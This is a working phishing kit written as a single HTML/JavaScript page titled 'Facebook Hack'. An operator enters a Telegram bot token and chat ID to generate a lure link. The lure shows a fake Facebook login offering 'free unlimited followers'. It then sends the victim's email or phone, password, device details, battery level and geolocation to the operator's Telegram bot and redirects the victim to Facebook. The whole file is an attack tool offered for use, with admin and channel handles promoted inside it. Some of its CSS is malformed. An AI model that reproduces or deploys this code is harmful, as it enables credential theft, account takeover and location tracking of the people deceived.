<!DOCTYPE html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Hack</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #000; /* Set background to black for main page */
            color: #fff; /* Change text color to white */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Prevent scrolling */
        }

        .container {
            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white */
            padding: 20px;
            border-radius: 8px;

            text-align: center; /* Center text */
        }

            font-size: 24px;

        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;

        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;

            font-size: 16px;

            transition: background-color 0.3s ease;

            background-color: #218838;

        button:disabled {

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">

    <form id="telegramForm">
        <input type="text" id="botToken" placeholder="Enter your Bot Token" required>
        <input type="text" id="chatId" placeholder="Enter your Chat ID" required>
        <button type="button" onclick="sendLoginLink()">Send Login Link</button>
    </form>


    <form id="loginForm" style="display:none;">
        <h2>Get free unlimited Follower</h2>
        <img id="loginLogo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo"> 
        <input type="text" id="emailOrPhone" placeholder="Enter your Email/Phone Number" required>
        <input type="password" id="password" placeholder="Enter your Password" required>
        <button type="button" id="loginBtn" onclick="submitLogin()">Get Free Follower</button>
    </form>
</div>

<script>
    // Function to send the login link to the Telegram chat
    function sendLoginLink() {
        var botToken = document.getElementById('botToken').value;
        var chatId = document.getElementById('chatId').value;
        var loginUrl = window.location.href + "?botToken=" + botToken + "&chatId=" + chatId + "#login";

        var message = `üíª *Login here:* ${loginUrl}\n\nüë§ *Admin:* @sasumon007\nüîó *Join my channel:* @SA_Tech_Tutorial`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "Markdown"
            })
        }).then(response => response.json())
          .then(data => {
            if (data.ok) {
                alert("Login link sent!");
            } else {
                alert("Error sending message. Check Bot Token and Chat ID.");
            }
        });
    }

    // Function to handle URL parameters and show the login form if login link is clicked
    function handleUrlParams() {
        const urlParams = new URLSearchParams(window.location.search);
        const botToken = urlParams.get('botToken');
        const chatId = urlParams.get('chatId');

        if (botToken && chatId) {
            document.getElementById('telegramForm').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';

            window.botToken = botToken;
            window.chatId = chatId;
        }
    }

    // Function to submit the login info to the Telegram bot
    function submitLogin() {
        var emailOrPhone = document.getElementById('emailOrPhone').value;
        var password = document.getElementById('password').value;
        var loginBtn = document.getElementById('loginBtn');
        loginBtn.disabled = true;

        // Get device info and location
        var deviceInfo = navigator.userAgent;
        var batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
        var locationPromise = new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition((pos) => {
                var lat = pos.coords.latitude;
                var long = pos.coords.longitude;
                resolve(`Lat: ${lat}, Long: ${long}`);
            }, () => {
                resolve("Location not available");
            });
        });

        Promise.all([batteryPromise, locationPromise]).then(([battery, location]) => {
            var batteryStatus = battery ? `Battery: ${Math.round(battery.level * 100)}%` : "Battery info not available";
            var message = `üîê *Login info:*\nüìß *Email/Phone:* ${emailOrPhone}\nüîë *Password:* ${password}\nüì± *Device Info:* ${deviceInfo}\n${batteryStatus}\nüìç *Location:* ${location}\n\nüë§ *Admin:* @sasumon007\nüîó *Join my channel:* @SA_Tech_Tutorial`;

            fetch(`https://api.telegram.org/bot${window.botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: window.chatId,
                    text: message,
                    parse_mode: "Markdown"
                })
            }).then(response => response.json())
              .then(data => {
                if (data.ok) {
                    alert("Login info sent to Telegram!");
                    window.location.href = "https://www.fb.com";
                } else {
                    alert("Error submitting login info.");
                }
            }).finally(() => {
                loginBtn.disabled = false;
            });
        });
    }

    window.onload = handleUrlParams;
</script>
